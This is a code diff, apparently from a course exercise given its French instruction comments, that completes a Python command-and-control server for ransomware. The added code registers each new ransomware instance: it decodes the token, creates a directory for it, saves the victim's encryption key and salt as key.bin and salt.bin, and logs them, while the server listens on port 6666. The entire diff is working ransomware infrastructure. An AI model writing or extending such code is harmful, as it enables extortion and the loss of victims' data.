@@ -12,6 +12,10 @@ class CNC(CNCBase):
     def save_b64(self, token:str, data:str, filename:str):
         # helper
         # token and data are base64 field
+        token=str(base64.b64decode(token).hex())
+        path=os.path.join(CNC.ROOT_PATH,token)
+        if not os.path.exists(path):
+            os.mkdir(path)
 
         bin_data = base64.b64decode(data)
         path = os.path.join(CNC.ROOT_PATH, token, filename)
@@ -22,10 +26,22 @@ class CNC(CNCBase):
         # used to register new ransomware instance
         # Elle doit créer un répertoire à partir du token et y stocker la clef et le sel dans 2 fichiers .bin
         # ici on utilise pas param
-
-        # creer dossier portant le nom du token et créer deux fichiers : key.bin et salt.bin
-        self.write(json.dumps(body))
-        return {"status":"KO"}
+        try:
+            key=body['key']
+            salt=body['salt']
+            token=body['token']
+             # creer dossier portant le nom du token et créer deux fichiers : key.bin et salt.bin
+            self.save_b64(token, key,'key.bin')
+            self.save_b64(token, salt,'salt.bin')
+            self.log_message(f'New [token, salt]:[{token,salt}]')
+            # self.write(json.dumps(body))
+            return {'status':'ok'}
+        except Exception as excp:
+            self.log_message(f'Exception Error {excp}')
+            return {'status':'error'}
+            
+       
+        
 
            
 httpd = HTTPServer(('0.0.0.0', 6666), CNC)
